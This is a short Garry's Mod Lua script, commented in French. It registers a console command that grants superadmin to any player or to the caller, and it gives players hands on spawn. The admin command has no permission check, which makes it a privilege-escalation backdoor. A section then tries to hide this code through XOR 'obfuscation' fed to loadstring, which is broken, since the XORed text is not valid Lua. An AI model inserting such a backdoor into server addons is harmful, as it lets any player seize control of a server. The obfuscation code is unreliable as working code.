--Fonction pour attribuer des permissions d'administrateur à un joueur
local function GrantAdmin(ply, cmd, args)
  local target = args[1]
  local player = tonumber(target)
  
  if player then
    player = Player(player)
  else
    player = ply
  end
  
  if not IsValid(player) then return end
  
  player:SetUserGroup("superadmin")
  print(player:Nick() .. " est maintenant un administrateur.")
end
concommand.Add("grant_admin", GrantAdmin)

--Fonction pour ajouter un objet "Mains vides" aux joueurs
local function GiveWeapon(ply)
  ply:Give("gmod_hands")
end
hook.Add("PlayerSpawn", "GiveWeapon", GiveWeapon)

-- Obfuscation du code
local function Obfuscate(str)
  local new_str = ""
  for i = 1, #str do
    new_str = new_str .. string.char(bit.bxor(str:byte(i), 5))
  end
  return new_str
end

local obfuscated_grant_admin = Obfuscate([[
  local function GrantAdmin(ply, cmd, args)
    local target = args[1]
    local player = tonumber(target)

    if player then
      player = Player(player)
    else
      player = ply
    end

    if not IsValid(player) then return end

    player:SetUserGroup("superadmin")
    print(player:Nick() .. " est maintenant un administrateur.")
  end
  concommand.Add("grant_admin", GrantAdmin)
]])

local obfuscated_give_weapon = Obfuscate([[
  local function GiveWeapon(ply)
    ply:Give("gmod_hands")
  end
  hook.Add("PlayerSpawn", "GiveWeapon", GiveWeapon)
]])

loadstring(obfuscated_grant_admin)()
loadstring(obfuscated_give_weapon)()
